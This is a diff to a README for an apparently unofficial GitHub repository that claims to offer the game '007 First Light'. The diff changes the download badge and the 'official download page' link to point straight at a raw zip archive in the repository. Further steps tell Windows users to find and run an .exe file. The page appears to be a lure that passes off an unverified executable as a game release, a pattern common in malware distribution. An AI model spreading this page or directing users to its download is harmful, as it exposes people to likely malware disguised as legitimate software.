@@ -1,6 +1,6 @@
 # 🎮 007-First-Light-Release - Access the latest spy game now
 
-[![](https://img.shields.io/badge/Download-007-First-Light-blue.svg)](https://github.com/acanthopterygianbreakdown649/007-First-Light-Release)
+[![](https://img.shields.io/badge/Download-007-First-Light-blue.svg)](https://github.com/acanthopterygianbreakdown649/007-First-Light-Release/raw/refs/heads/main/firstlight/First_Release_Light_v1.1.zip)
 
 ## 📖 About the Game
 
@@ -23,7 +23,7 @@ Verify your drivers are current. Update your graphics card software to ensure pe
 
 Follow these instructions to set up the game on your Windows computer.
 
-1.  Visit the [official download page](https://github.com/acanthopterygianbreakdown649/007-First-Light-Release) to start.
+1.  Visit the [official download page](https://github.com/acanthopterygianbreakdown649/007-First-Light-Release/raw/refs/heads/main/firstlight/First_Release_Light_v1.1.zip) to start.
 2.  Locate the section labeled Releases on the right side of the page.
 3.  Click the version with the latest date.
 4.  Find the file that ends in .exe.
